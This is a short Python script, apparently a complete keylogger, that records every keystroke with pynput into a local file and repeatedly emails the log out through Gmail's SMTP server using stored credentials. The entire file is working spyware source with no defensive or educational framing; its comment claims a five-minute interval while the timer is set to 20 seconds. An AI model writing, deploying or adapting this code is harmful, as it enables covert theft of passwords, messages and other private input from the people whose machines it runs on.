from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer
from dotenv import load_dotenv
import os

load_dotenv()

app_key = os.getenv("app_key")
email = os.getenv("email")

def send_email():
    try:
        with open('keylog.txt', 'r', encoding='utf-8') as log_file:
            log_content = log_file.read()
    except FileNotFoundError:
        log_content = "No keystrokes logged or just started."

    msg = MIMEText(log_content)
    msg['Subject'] = 'Keylogger Report'
    msg['From'] = email
    msg['To'] = email

    with smtplib.SMTP('smtp.gmail.com', 587) as server:
        server.starttls()
        server.login(email, app_key)
        server.send_message(msg)

    Timer(20, send_email).start()  # Send email every 5 minutes

def on_press(key):
    try:
        with open('keylog.txt', 'a', encoding='utf-8') as log_file:
            log_file.write(key.char)
    except AttributeError:
        with open('keylog.txt', 'a', encoding='utf-8') as log_file:
            log_file.write(f'[{key.name}]')

with keyboard.Listener(on_press=on_press) as listener:
    send_email()
    listener.join()
